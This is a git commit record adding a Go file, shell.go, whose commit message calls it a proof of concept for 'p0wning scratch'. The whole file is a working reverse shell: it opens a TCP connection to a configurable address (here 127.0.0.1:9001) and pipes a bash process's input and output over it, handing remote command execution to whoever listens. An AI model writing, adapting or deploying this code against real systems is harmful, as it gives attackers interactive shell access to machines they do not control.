0e38a06c5264b42794286cfa4303cc334eb83ab9
BuildAndDestroy <devreap1@gmail.com>
2023-07-31 19:26:15 -0600

    Scratch: PoC for p0wning scratch

---
+++ linux/scratch/shell.go
@@ -0,0 +1,21 @@
+package main
+import (
+ "net"
+ "os"
+ "os/exec"
+)
+var connectString string = "127.0.0.1:9001"
+func main() {
+if len(connectString) == 0 {
+  os.Exit(1)
+ }
+conn, err := net.Dial("tcp", connectString)
+ if err != nil {
+  os.Exit(1)
+ }
+cmd := exec.Command("/bash")
+ cmd.Stdin = conn
+ cmd.Stdout = conn
+ cmd.Stderr = conn
+cmd.Run()
+}
